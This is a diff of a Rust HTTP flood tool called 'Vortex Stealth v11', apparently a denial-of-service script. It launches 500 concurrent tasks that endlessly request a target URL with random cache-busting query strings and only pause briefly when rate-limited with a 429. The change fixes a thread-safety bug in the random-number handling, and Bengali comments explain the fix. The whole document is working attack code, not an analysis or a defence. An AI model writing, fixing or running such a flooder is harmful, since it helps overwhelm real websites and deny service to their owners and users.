@@ -1,6 +1,5 @@
 use reqwest::{Client, header};
 use std::time::Duration;
-use rand::Rng;
 
 #[tokio::main]
 async fn main() {
@@ -17,7 +16,7 @@ async fn main() {
         .timeout(Duration::from_secs(10))
         .build().unwrap();
 
-    println!("🚀 Vortex Stealth v11 Active | Managing 429 Errors...");
+    println!("🚀 Vortex Stealth v11: Thread-Safe Edition Active!");
 
     let mut handles = vec![];
     for i in 0..500 {
@@ -25,19 +24,21 @@ async fn main() {
         let target_ref = target.to_string();
         
         handles.push(tokio::spawn(async move {
-            let mut rng = rand::thread_rng();
             loop {
-                let url = format!("{}?v={}", target_ref, rng.gen::<u32>());
+                // ফিক্স: সরাসরি rand::random ব্যবহার করা হয়েছে
+                // এটি কোন হ্যান্ডেল ধরে রাখে না, তাই await-এ কোন সমস্যা হবে না
+                let r_id: u32 = rand::random();
+                let url = format!("{}?v={}", target_ref, r_id);
                 
                 match client_ref.get(&url).send().await {
                     Ok(resp) => {
                         let status = resp.status().as_u16();
                         if i == 0 { println!("📡 Status: {}", status); }
 
-                        // যদি ৪২৯ আসে, তবে কিছুক্ষণ বিরতি দাও যাতে সার্ভার শান্ত হয়
                         if status == 429 {
-                            let wait_time = rng.gen_range(500..2000);
-                            tokio::time::sleep(Duration::from_millis(wait_time)).await;
+                            // ৪২৯ এরর আসলে একটু বিরতি দেওয়া (র্যান্ডম বিরতি)
+                            let sleep_ms = (r_id % 1500) + 500; 
+                            tokio::time::sleep(Duration::from_millis(sleep_ms as u64)).await;
                         }
                     }
                     Err(_) => {
